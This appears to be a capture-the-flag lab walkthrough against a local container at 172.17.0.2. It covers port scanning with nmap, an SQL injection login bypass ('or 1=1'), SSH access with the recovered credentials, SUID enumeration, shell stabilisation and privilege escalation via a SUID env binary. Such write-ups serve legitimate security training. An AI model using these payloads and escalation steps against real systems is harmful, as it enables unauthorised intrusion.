![image](https://github.com/user-attachments/assets/231e8b90-fc33-4602-be7b-ef355e7ccefc)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250116105358](https://github.com/user-attachments/assets/03259d79-a703-4d3b-a710-a520d08db66e)
![Pasted image 20250116105423](https://github.com/user-attachments/assets/9fd00a48-60c5-44c6-924f-4a7e39b6e08f)
![Pasted image 20250116105507](https://github.com/user-attachments/assets/6550020d-d7f4-489f-aa29-9031001c65f9)

```bash
whatweb https://172.17.0.2/index.php
```
![Pasted image 20250116105652](https://github.com/user-attachments/assets/b2bc2d97-6843-45e1-964e-411fadf2d8f6)

## **we work port 80**

![Pasted image 20250116105741](https://github.com/user-attachments/assets/afbacc4b-5b2f-44ec-8a14-52ed368b9430)
![Pasted image 20250116111811](https://github.com/user-attachments/assets/8df8f5d8-73de-4a3e-8144-5fe65a433816)

## **we will try to bypass the login using a parameter that tells it that it can be any user or the truth that 1=1 which for practical purposes would give us the same result as entering the valid user.**
```SQL
User' or 1=1-- -
```
![Pasted image 20250116112009](https://github.com/user-attachments/assets/1d391c93-1eea-464c-8c6f-3d6301102991)

## **now we will log in by SSH with the user and password we got**
```bash
ssh dylan@172.17.0.2
```
![Pasted image 20250116112325](https://github.com/user-attachments/assets/26628013-68c3-4deb-969d-d5940ae2b1ae)

## **we are already inside now we will escalate privileges**
```bash
find / -perm -4000 2>/dev/null
```
![Pasted image 20250116112458](https://github.com/user-attachments/assets/203e1bd6-626f-48fd-be13-2d7840b0bdcc)

## **we apply TTY treatment**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![Pasted image 20250116112558](https://github.com/user-attachments/assets/ad4c23a0-6005-4ac8-bfa6-bbf35aa28727)
```bash
/usr/bin/env /bin/sh -p  # esta es la ruta absoluta
```
![Pasted image 20250116114050](https://github.com/user-attachments/assets/9530f5c4-2ba5-49e8-88ab-f55e4e4cda96)
















